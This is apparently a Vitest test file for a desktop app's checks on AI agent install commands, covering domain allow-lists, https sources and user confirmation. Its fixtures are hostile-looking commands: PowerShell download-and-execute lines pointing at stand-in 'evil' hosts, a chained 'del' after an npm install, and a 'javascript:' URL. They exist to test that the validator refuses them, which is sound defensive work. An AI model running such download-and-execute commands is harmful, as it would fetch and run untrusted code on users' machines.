import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { AGENT_INSTALLS, SHELL_IDS, checkInstall, isPlainInstall, isRemoteScript, onAllowedDomain, urlsIn } from '../agentInstalls'
import { NPM_PACKAGES } from '../agentUpdates'

const indexFile = readFileSync(join(__dirname, '..', 'index.js'), 'utf8')
const indexSource = indexFile.slice(indexFile.indexOf('const AGENT_PRESETS = ['), indexFile.indexOf('async function getAgents('))

describe('agent install data', () => {
  const entries = Object.entries(AGENT_INSTALLS)

  it('every preset with no npm install of its own has an install or an install page', () => {
    // Every `install: null` of the presets now names its install data.
    expect(indexSource).not.toMatch(/^\s+install: null\b/m)
    for (const id of Object.keys(AGENT_INSTALLS)) expect(indexSource).toContain(`...AGENT_INSTALLS.${id}`)
    for (const [, d] of entries) expect(!!(d.install || d.docsUrl)).toBe(true)
  })

  it('every script install names its shell and an https source on its allowed domains', () => {
    for (const [id, d] of entries) {
      if (!d.install || isPlainInstall(d.install)) continue
      expect(d.installSource, id).toMatch(/^https:\/\//)
      expect(onAllowedDomain(d.installSource, d.allowedDomains), id).toBe(true)
      if (isRemoteScript(d.install)) {
        expect(SHELL_IDS, id).toContain(d.installShell)
        const urls = urlsIn(d.install)
        expect(urls.length, id).toBeGreaterThan(0)
        for (const u of urls) expect(onAllowedDomain(u, d.allowedDomains), `${id}: ${u}`).toBe(true)
      }
    }
  })

  it('every entry passes its own checks: the window gets what is written here', () => {
    for (const [id, d] of entries) {
      const c = checkInstall(d)
      if (d.install) {
        expect(c.install, id).toEqual(d.install)
        expect(c.installConfirm, id).toBe(!isPlainInstall(d.install))
      } else {
        expect(c.install, id).toBe(null)
        expect(c.docsUrl, id).toBe(d.docsUrl)
        expect(d.docsUrl, id).toMatch(/^https:\/\//)
      }
    }
  })

  it('npm installs here are the packages agent updates know', () => {
    for (const [id, d] of entries) {
      if (!d.install || !isPlainInstall(d.install)) continue
      expect(d.install[0], id).toBe(`npm install -g ${NPM_PACKAGES[id]}`)
    }
  })
})

describe('checkInstall', () => {
  const script = {
    install: ['irm https://example.com/install.ps1 | iex'],
    installShell: 'powershell',
    installSource: 'https://docs.example.com/cli',
    allowedDomains: ['example.com']
  }

  it('npm and winget installs need no confirmation', () => {
    expect(checkInstall({ install: ['npm install -g @scope/cli'] }).installConfirm).toBe(false)
    expect(checkInstall({ install: ['npm install -g --ignore-scripts pkg'] }).installConfirm).toBe(false)
    expect(checkInstall({ install: ['winget install --id Ollama.Ollama -e'] }).installConfirm).toBe(false)
  })

  it('anything else is confirmed first', () => {
    expect(checkInstall(script)).toMatchObject({ install: script.install, installShell: 'powershell', installSource: script.installSource, installConfirm: true })
    // npm with something chained after it is not a plain install.
    const chained = { install: ['npm install -g pkg && del x'], installSource: 'https://example.com', allowedDomains: ['example.com'] }
    expect(checkInstall(chained).installConfirm).toBe(true)
    const pip = { install: ['python -m pip install aider-install', 'aider-install'], installSource: 'https://aider.chat/docs/install.html', allowedDomains: ['aider.chat'] }
    expect(checkInstall(pip).installConfirm).toBe(true)
  })

  it('refuses a script downloaded from another domain, over http, or with no shell', () => {
    expect(checkInstall({ ...script, install: ['irm https://evil.example.org/install.ps1 | iex'] }).install).toBe(null)
    expect(checkInstall({ ...script, install: ['irm http://example.com/install.ps1 | iex'] }).install).toBe(null)
    expect(checkInstall({ ...script, install: ['irm https://example.com.evil.org/x.ps1 | iex'] }).install).toBe(null)
    expect(checkInstall({ ...script, install: ['irm https://example.com/a.ps1 | iex; irm https://evil.org/b | iex'] }).install).toBe(null)
    expect(checkInstall({ ...script, installShell: null }).install).toBe(null)
    expect(checkInstall({ ...script, installShell: 'bash -c' }).install).toBe(null)
    // A download whose address cannot be checked.
    expect(checkInstall({ ...script, install: ['iex $env:SOMEWHERE'] }).install).toBe(null)
  })

  it('refuses a confirmed install whose source is not https on its domains', () => {
    expect(checkInstall({ ...script, installSource: 'http://example.com/docs' }).install).toBe(null)
    expect(checkInstall({ ...script, installSource: 'https://elsewhere.org/docs' }).install).toBe(null)
    expect(checkInstall({ ...script, installSource: undefined }).install).toBe(null)
  })

  it('refused: the install page instead, when there is one', () => {
    expect(checkInstall({ ...script, install: ['irm https://evil.org/x | iex'] }).docsUrl).toBe(script.installSource)
    expect(checkInstall({ docsUrl: 'https://example.com/install' })).toMatchObject({ install: null, docsUrl: 'https://example.com/install' })
    expect(checkInstall({ docsUrl: 'http://example.com/install' }).docsUrl).toBe(null)
    expect(checkInstall({ docsUrl: 'javascript:alert(1)' }).docsUrl).toBe(null)
    expect(checkInstall({})).toMatchObject({ install: null, docsUrl: null })
  })
})

describe('onAllowedDomain', () => {
  it('matches the domain, its subdomains, and a path prefix', () => {
    expect(onAllowedDomain('https://cursor.com/install?win32=true', ['cursor.com'])).toBe(true)
    expect(onAllowedDomain('https://static.devin.ai/cli/setup.ps1', ['devin.ai'])).toBe(true)
    expect(onAllowedDomain('https://notdevin.ai/x', ['devin.ai'])).toBe(false)
    expect(onAllowedDomain('https://github.com/can1357/oh-my-pi', ['github.com/can1357/oh-my-pi'])).toBe(true)
    expect(onAllowedDomain('https://github.com/someone/else', ['github.com/can1357/oh-my-pi'])).toBe(false)
    expect(onAllowedDomain('https://user:pw@cursor.com/x', ['cursor.com'])).toBe(false)
    expect(onAllowedDomain('https://cursor.com:8443/x', ['cursor.com'])).toBe(false)
    expect(onAllowedDomain('not a url', ['cursor.com'])).toBe(false)
  })
})

describe('installAgent in the window', () => {
  const app = readFileSync(join(__dirname, '..', '..', 'renderer', 'src', 'App.vue'), 'utf8')
  const body = app.slice(app.indexOf('async function installAgentConfirmed(agent)'), app.indexOf('// --- Sessions'))

  it('a confirmed install asks first, shows the exact steps and runs nothing else', () => {
    expect(app).toMatch(/if \(agent\.installConfirm\) return installAgentConfirmed\(agent\)/)
    const ask = body.indexOf('askConfirm(')
    expect(ask).toBeGreaterThan(0)
    expect(body.indexOf('if (ok !== true) return')).toBeGreaterThan(ask)
    expect(body.indexOf('writePty')).toBeGreaterThan(body.indexOf('if (ok !== true) return'))
    // The dialog's code is the list that runs.
    expect(body).toMatch(/code: install\.join\('\\n'\)/)
    expect(body).toMatch(/installChain\(install, null, shellId\)/)
  })
})
